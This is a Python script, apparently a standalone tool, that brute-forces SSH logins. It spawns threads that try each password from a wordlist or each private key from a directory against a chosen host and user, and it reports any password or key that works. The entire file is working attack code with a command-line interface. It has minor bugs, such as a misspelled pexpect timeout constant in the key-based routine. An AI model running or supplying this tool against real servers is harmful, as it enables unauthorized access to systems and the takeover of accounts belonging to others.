#!/usr/bin/env python3
# coding=utf-8
__author__ = "riverchu"

import os
import optparse
import time
import pexpect

from pexpect import pxssh
from threading import *

MAX_CONNECTION = 10
CONNECTION_LOCK = BoundedSemaphore(value=MAX_CONNECTION)

Found = False
Fails = 0
FAIL_LIMIT = 10
KEYFILE = None
PASSWD = None
CIPHERS = 'aes128-cbc,3des-cbc,aes128-ctr,aes192-ctr,aes256-ctr'


def reset():
    """重置所有信息

    :return:
    """
    global Found, Fails
    global PASSWD, KEYFILE
    Found = False
    Fails = 0
    KEYFILE = None
    PASSWD = None


def connect_with_passwd(host, user, passwd, release):
    """密码连接ssh

    :param host:目标主机
    :param user:目标用户
    :param passwd:测试密码
    :param release:是否有权释放线程锁
    :return:
    """
    global Found, Fails, PASSWD
    s = None
    try:
        s = pxssh.pxssh(options={'Ciphers': CIPHERS})
        s.login(host, user, passwd)
        PASSWD = passwd
        Found = True
        s.logout()
    except Exception as e:
        # 出现错误 s置为空
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect_with_passwd(host, user, passwd, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect_with_passwd(host, user, passwd, False)
        elif 'Could not establish connection to host' in str(e):
            Fails += 1
            time.sleep(2)
    finally:
        # print(s.after)
        if s:
            s.close()
        if release:
            CONNECTION_LOCK.release()


def connect_with_key(host, user, keyfile, release):
    """密钥连接ssh

    :param user: 目标用户名
    :param host: 目标主机
    :param keyfile: 密钥文件
    :param release: 是否有权释放线程锁
    :return:
    """
    global Found
    global Fails
    global KEYFILE
    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = '-o PasswordAuthentication=no'
        connect_str = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt
        child = pexpect.spawn(connect_str)
        ret = child.expect([pexpect.TMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#'])
        if ret == 0 or ret == 1:
            # print('[-] Connect Failed.Time out error.')
            Fails += 1
        elif ret == 2:
            # print('[-] Adding Host to !/.ssh/known_hosts')
            child.sendline('yes')
            connect_with_key(host, user, keyfile, False)
        elif ret == 3:
            # print('[-] Connection Closed By Remote Host')
            Fails += 1
        elif ret > 3:
            # print('[+] Success. '+str(keyfile))
            KEYFILE = str(keyfile)
            Found = True
    finally:
        if release:
            CONNECTION_LOCK.release()


def ssh_key(host, user, key_dir):
    """使用key连接ssh

    :param user: 目标用户
    :param host: 目标主机
    :param key_dir: 密钥文件
    :return:
    """
    global Found
    global Fails
    threads = []
    for filename in os.listdir(key_dir):
        if Found:
            break
        if Fails > FAIL_LIMIT:
            break
        fullpath = os.path.join(key_dir, filename)
        print('[*] Testing keyfile ' + str(fullpath))
        t = Thread(target=connect_with_key, args=(host, user, fullpath, True))
        t.setDaemon(True)
        threads.append(t)
        t.start()
    if not Found:
        for t in threads:
            t.join()


def ssh_pass(host, user, passwd_file):
    """使用密码连接ssh

    :param host: 目标主机
    :param user: 目标用户
    :param passwd_file: 密码文件
    :return:
    """
    global Found
    global Fails
    threads = []
    fn = open(passwd_file, 'r')
    for line in fn.readlines():
        if Found:
            break
        if Fails > FAIL_LIMIT:
            break
        CONNECTION_LOCK.acquire()
        passwd = line.strip('\r').strip('\n')
        print('[*] Host:' + host + ' Testing: ' + str(passwd))
        t = Thread(target=connect_with_passwd, args=(host, user, passwd, True))
        t.setDaemon(True)
        threads.append(t)
        t.start()
    if not Found:
        for t in threads:
            t.join()


def brute_ssh(host, user, *, pass_key_dir=None, passwd_file=None, max_connection=None):
    """ssh爆破函数

    :param host: 目标主机
    :param user: 目标用户
    :param pass_key_dir: 密钥文件
    :param passwd_file: 密码字典文件
    :param max_connection: 最大连接数
    :return:
    """
    if pass_key_dir is None and passwd_file is None:
        print('[-] Wrong parameters.')

    global MAX_CONNECTION, CONNECTION_LOCK
    global Found, Fails
    global PASSWD, KEYFILE

    if max_connection != 10 and max_connection is not None and max_connection != '':
        MAX_CONNECTION = int(max_connection)
        CONNECTION_LOCK = BoundedSemaphore(value=MAX_CONNECTION)

    ret = {'host': host, 'user': user, 'ssh_type': None, 'key': None}
    if pass_key_dir:
        ssh_key(host, user, pass_key_dir)
        if Found:
            print('[+] Keyfile Found: ' + KEYFILE)
        elif Fails > FAIL_LIMIT:
            print('[-] Exiting: Too Many Connections Closed By Remote Host.')
            print('[-] Adjust number of simultaneous threads.')
        else:
            print('[-] No Key Found.')
        ret['ssh_type'] = 'publicKey'
        ret['key'] = KEYFILE
        reset()
        return ret
    elif passwd_file:
        ssh_pass(host, user, passwd_file)
        if Found:
            print('[+] ' + host + '\'s Password Found: ' + PASSWD)
        elif Fails > FAIL_LIMIT:
            print('[-] Too Many Socket Timeouts Or Could not establish connection to host')
        else:
            print('[-] No Password Found.')
        ret['ssh_type'] = 'password'
        ret['key'] = PASSWD
        ret['time'] = time.strftime('%Y-%m-%d %H:%M:%S')
        reset()
        return ret


def main():
    """单独调用

    :return:
    """
    parser = optparse.OptionParser('usage %prog ' + '-H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
    parser.add_option('-d', dest='passKeyDir', type='string', help='specify directory with keys')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    parser.add_option('--maxc', dest='maxConnection', type='string', help='specify the max connections')
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwd_file = options.passwdFile
    pass_key_dir = options.passKeyDir
    user = options.user
    max_connection = options.maxConnection

    if host is None or (passwd_file is None and pass_key_dir is None) or user is None:
        print(parser.usage)
        exit(0)

    try:
        brute_ssh(host, user, passwd_file=passwd_file, pass_key_dir=pass_key_dir, max_connection=max_connection)
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print('[-]', e)


if __name__ == "__main__":
    main()
